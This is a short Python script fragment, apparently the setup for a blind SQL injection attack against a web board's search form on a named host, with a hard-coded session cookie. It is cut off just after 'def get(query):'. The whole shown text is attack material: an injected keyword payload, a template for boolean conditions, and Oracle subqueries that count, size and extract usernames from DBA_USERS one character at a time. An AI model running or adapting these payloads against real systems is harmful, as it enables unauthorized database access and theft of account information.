### VAL AREA
targetURL = "http://elms1.skinfosec.co.kr:8082/community6/free"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
cookies = {"JSESSIONID": "8623A875E3EA6CF5471045FFA0614F6F"}
data = {
    "startDt": "",
    "endDt": "",
    "searchType": "all",
    "keyword": "aaaa%' and 'a%'='a",
}

targetString = "카카오"

baseQuery = "aaaa%' and {} and 'a%'='a"

countQuery = "(SELECT COUNT(USERNAME) AS total_usernames FROM DBA_USERS) > "
indexQuery = "(SELECT length(USERNAME) FROM (SELECT USERNAME, rownum as rnum FROM DBA_USERS) WHERE rnum = {}) > "
dataQuery = "(SELECT ascii(substr(USERNAME, {}, 1)) FROM (SELECT USERNAME, rownum as rnum FROM DBA_USERS) WHERE rnum = {}) > "


def get(query):
